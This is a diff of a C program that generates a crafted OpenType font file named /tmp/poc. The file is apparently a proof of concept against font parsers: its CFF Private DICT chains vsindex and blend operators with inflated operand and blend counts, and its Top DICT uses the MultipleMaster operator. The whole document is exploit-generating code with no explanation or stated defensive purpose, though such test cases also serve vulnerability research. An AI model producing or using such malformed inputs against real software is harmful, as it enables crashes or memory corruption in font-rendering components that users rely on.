@@ -1,121 +1,134 @@
 #include <stdio.h>
-#include <stdlib.h>
+#include <stdint.h>
 
 int main(void) {
     FILE *f = fopen("/tmp/poc", "wb");
-    if (!f) { perror("fopen"); return 1; }
+    if (!f) return 1;
 
-    unsigned char buf[1024];
-    int pos = 0;
+    /* OTTO header */
+    fwrite("OTTO", 1, 4, f);
+    fputc(0, f); fputc(1, f);       /* numTables = 1 */
+    fputc(0, f); fputc(0, f);       /* searchRange */
+    fputc(0, f); fputc(0, f);       /* entrySelector */
+    fputc(0, f); fputc(0, f);       /* rangeShift */
 
-    /* CFF2 Header (5 bytes) */
-    buf[pos++] = 0x02; buf[pos++] = 0x00; buf[pos++] = 0x05;
-    int topDictLenPos = pos;
-    buf[pos++] = 0; buf[pos++] = 0; /* placeholder */
+    /* Table record: 16 bytes */
+    fwrite("CFF ", 1, 4, f);
+    fputc(0, f); fputc(0, f); fputc(0, f); fputc(0, f); /* checksum */
+    long off_pos = ftell(f);
+    fputc(0, f); fputc(0, f); fputc(0, f); fputc(0, f); /* offset */
+    long len_pos = ftell(f);
+    fputc(0, f); fputc(0, f); fputc(0, f); fputc(0, f); /* length */
 
-    /* Top DICT */
-    int topDictStart = pos;
+    long cff_base = ftell(f);
 
-    /* VarStore: push offset (3 bytes), op 0x1C 0x19 */
-    int varStoreOffPos = pos;
-    buf[pos++] = 0; buf[pos++] = 0; buf[pos++] = 0; /* placeholder */
-    buf[pos++] = 0x1C; buf[pos++] = 0x19;
+    /* CFF1 header */
+    fputc(1, f);                     /* major = 1 */
+    fputc(0, f);                     /* minor = 0 */
+    fputc(4, f);                     /* hdrSize = 4 */
+    fputc(1, f);                     /* offSize = 1 */
 
-    /* Private: push size, push offset, op 0x1C 0x12 */
-    int privSizePos = pos;
-    buf[pos++] = 0; buf[pos++] = 0; buf[pos++] = 0; /* placeholder */
-    int privOffPos = pos;
-    buf[pos++] = 0; buf[pos++] = 0; buf[pos++] = 0; /* placeholder */
-    buf[pos++] = 0x1C; buf[pos++] = 0x12;
+    /* Name INDEX: count=1, name="A" */
+    fputc(0, f); fputc(1, f);       /* count = 1 */
+    fputc(1, f);                     /* offSize = 1 */
+    fputc(1, f);                     /* offset[0] = 1 */
+    fputc(2, f);                     /* offset[1] = 2 */
+    fputc('A', f);                   /* name data */
 
-    /* CharStrings: push offset, op 0x1C 0x11 */
-    int charOffPos = pos;
-    buf[pos++] = 0; buf[pos++] = 0; buf[pos++] = 0; /* placeholder */
-    buf[pos++] = 0x1C; buf[pos++] = 0x11;
+    /* Top DICT INDEX */
+    fputc(0, f); fputc(1, f);       /* count = 1 */
+    fputc(1, f);                     /* offSize = 1 */
+    fputc(1, f);                     /* offset[0] = 1 */
+    long top_off1_pos = ftell(f);
+    fputc(0, f);                     /* offset[1] placeholder */
+    long top_data_start = ftell(f);
 
-    int topDictEnd = pos;
-    int topDictLen = topDictEnd - topDictStart;
+    /* Top DICT data: MultipleMaster + Private + CharStrings */
+    fputc(0x8B + 2, f);             /* push 2 */
+    fputc(0x8B + 1, f);             /* push 1 */
+    fputc(0x8B, f);                 /* push 0 */
+    fputc(0x8B, f);                 /* push 0 */
+    fputc(0x8B, f);                 /* push 0 */
+    fputc(0x1A, f);                 /* MultipleMaster */
 
-    /* CharStrings INDEX */
-    int charStart = pos;
-    buf[pos++] = 0; buf[pos++] = 1; /* count = 1 */
-    buf[pos++] = 1; /* offSize = 1 */
-    buf[pos++] = 1; buf[pos++] = 2; /* offsets */
-    buf[pos++] = 0x0D; /* endchar */
+    /* Private DICT: <size> <offset> 0x12 */
+    long priv_ref_pos = ftell(f);
+    fputc(0x8B, f);                 /* size placeholder */
+    fputc(0x8B, f);                 /* offset placeholder */
+    fputc(0x12, f);                 /* Private */
 
-    /* VarStore data */
-    int varStoreStart = pos;
-    buf[pos++] = 0; buf[pos++] = 0; /* format = 0 */
-    buf[pos++] = 0; buf[pos++] = 1; /* dataCount = 1 */
-    buf[pos++] = 0; buf[pos++] = 1; /* axisCount = 1 */
-    buf[pos++] = 0; buf[pos++] = 1; /* regionCount = 1 */
-    /* Region: axis=0, start=0.0, peak=1.0, end=1.0 (Fixed 16.16) */
-    buf[pos++] = 0; buf[pos++] = 0; /* axis index = 0 */
-    buf[pos++] = 0; buf[pos++] = 0; buf[pos++] = 0; buf[pos++] = 0; /* start = 0.0 */
-    buf[pos++] = 0; buf[pos++] = 0; buf[pos++] = 0x40; buf[pos++] = 0; /* peak = 1.0 (0x00010000) */
-    buf[pos++] = 0; buf[pos++] = 0; buf[pos++] = 0x40; buf[pos++] = 0; /* end = 1.0 */
-    /* VarData: regionIndicesCount=1, regionIndices[0]=0 */
-    buf[pos++] = 0; buf[pos++] = 1; /* regionIndicesCount */
-    buf[pos++] = 0; buf[pos++] = 0; /* regionIndices[0] = 0 */
+    /* CharStrings: <offset> 0x11 */
+    long char_ref_pos = ftell(f);
+    fputc(0x8B, f);                 /* offset placeholder */
+    fputc(0x11, f);                 /* CharStrings */
+
+    long top_data_end = ftell(f);
+    long top_data_sz = top_data_end - top_data_start;
+
+    /* Patch offset[1] */
+    fseek(f, top_off1_pos, SEEK_SET);
+    fputc((uint8_t)(top_data_sz + 1), f);
+    fseek(f, top_data_end, SEEK_SET);
+
+    /* String INDEX: empty */
+    fputc(0, f); fputc(0, f);       /* count = 0 */
+
+    /* Global Subr INDEX: empty */
+    fputc(0, f); fputc(0, f);       /* count = 0 */
+
+    /* CharStrings INDEX: count=1, one endchar */
+    long cs_start = ftell(f);
+    fputc(0, f); fputc(1, f);       /* count = 1 */
+    fputc(1, f);                     /* offSize = 1 */
+    fputc(1, f);                     /* offset[0] = 1 */
+    fputc(2, f);                     /* offset[1] = 2 */
+    fputc(0x0E, f);                  /* endchar */
 
     /* Private DICT */
-    int privStart = pos;
-    /* vsindex 0 */
-    buf[pos++] = 0x1C; buf[pos++] = 0; buf[pos++] = 0; /* push 0 */
-    buf[pos++] = 0x1C; buf[pos++] = 0x16; /* vsindex */
-    /* Two blends: each pushes 1,1,1,1,2,blend */
-    for (int i = 0; i < 2; i++) {
-        buf[pos++] = 0x1C; buf[pos++] = 0; buf[pos++] = 1; /* push 1 */
-        buf[pos++] = 0x1C; buf[pos++] = 0; buf[pos++] = 1; /* push 1 */
-        buf[pos++] = 0x1C; buf[pos++] = 0; buf[pos++] = 1; /* push 1 */
-        buf[pos++] = 0x1C; buf[pos++] = 0; buf[pos++] = 1; /* push 1 */
-        buf[pos++] = 0x1C; buf[pos++] = 0; buf[pos++] = 2; /* push 2 */
-        buf[pos++] = 0x1C; buf[pos++] = 0x17; /* blend */
-    }
-    int privSize = pos - privStart;
+    long priv_start = ftell(f);
+    fputc(0x8B, f); fputc(0x1E, f);  /* vsindex 0 */
 
-    /* Fix placeholders */
-    buf[topDictLenPos]   = (topDictLen >> 8) & 0xFF;
-    buf[topDictLenPos+1] = topDictLen & 0xFF;
+    /* First blend: 15 zeros + numBlends=5 */
+    for (int i = 0; i < 15; i++)
+        fputc(0x8B, f);
+    fputc(0x8B + 5, f);
+    fputc(0x0F, f);
 
-    buf[varStoreOffPos]   = (varStoreStart >> 16) & 0xFF;
-    buf[varStoreOffPos+1] = (varStoreStart >> 8) & 0xFF;
-    buf[varStoreOffPos+2] = varStoreStart & 0xFF;
+    /* Second blend: 24 zeros + numBlends=8 */
+    for (int i = 0; i < 24; i++)
+        fputc(0x8B, f);
+    fputc(0x8B + 8, f);
+    fputc(0x0F, f);
 
-    buf[privSizePos]   = (privSize >> 16) & 0xFF;
-    buf[privSizePos+1] = (privSize >> 8) & 0xFF;
-    buf[privSizePos+2] = privSize & 0xFF;
+    long priv_end = ftell(f);
+    long priv_sz = priv_end - priv_start;
+    long priv_off = priv_start - cff_base;
+    long cs_off = cs_start - cff_base;
 
-    buf[privOffPos]   = (privStart >> 16) & 0xFF;
-    buf[privOffPos+1] = (privStart >> 8) & 0xFF;
-    buf[privOffPos+2] = privStart & 0xFF;
+    /* Patch Private DICT reference */
+    fseek(f, priv_ref_pos, SEEK_SET);
+    fputc((uint8_t)(priv_sz + 139), f);
+    fputc((uint8_t)(priv_off + 139), f);
+    fputc(0x12, f);
 
-    buf[charOffPos]   = (charStart >> 16) & 0xFF;
-    buf[charOffPos+1] = (charStart >> 8) & 0xFF;
-    buf[charOffPos+2] = charStart & 0xFF;
+    /* Patch CharStrings reference */
+    fseek(f, char_ref_pos, SEEK_SET);
+    fputc((uint8_t)(cs_off + 139), f);
+    fputc(0x11, f);
 
-    int cff2Len = pos;
-
-    /* Write OpenType container */
-    /* sfVersion = 0x00010000 */
-    fputc(0, f); fputc(1, f); fputc(0, f); fputc(0, f);
-    /* numTables=1, searchRange=0, entrySelector=0, rangeShift=0 */
-    fputc(0, f); fputc(1, f); /* numTables */
-    fputc(0, f); fputc(0, f); /* searchRange */
-    fputc(0, f); fputc(0, f); /* entrySelector */
-    fputc(0, f); fputc(0, f); /* rangeShift */
-    /* Table directory: tag 'CFF2' */
-    fputc('C', f); fputc('F', f); fputc('F', f); fputc('2', f);
-    fputc(0, f); fputc(0, f); fputc(0, f); fputc(0, f); /* checksum */
-    fputc(0, f); fputc(0, f); fputc(0, f); fputc(28, f); /* offset = 28 */
-    fputc((cff2Len >> 24) & 0xFF, f);
-    fputc((cff2Len >> 16) & 0xFF, f);
-    fputc((cff2Len >> 8) & 0xFF, f);
-    fputc(cff2Len & 0xFF, f);
-
-    /* Write CFF2 data at offset 28 */
-    fseek(f, 28, SEEK_SET);
-    fwrite(buf, 1, cff2Len, f);
+    /* Patch table record */
+    long cff_end = ftell(f);
+    long cff_sz = cff_end - cff_base;
+    fseek(f, off_pos, SEEK_SET);
+    fputc((uint8_t)(cff_base >> 24), f);
+    fputc((uint8_t)(cff_base >> 16), f);
+    fputc((uint8_t)(cff_base >> 8), f);
+    fputc((uint8_t)(cff_base & 0xFF), f);
+    fseek(f, len_pos, SEEK_SET);
+    fputc((uint8_t)(cff_sz >> 24), f);
+    fputc((uint8_t)(cff_sz >> 16), f);
+    fputc((uint8_t)(cff_sz >> 8), f);
+    fputc((uint8_t)(cff_sz & 0xFF), f);
 
     fclose(f);
     return 0;
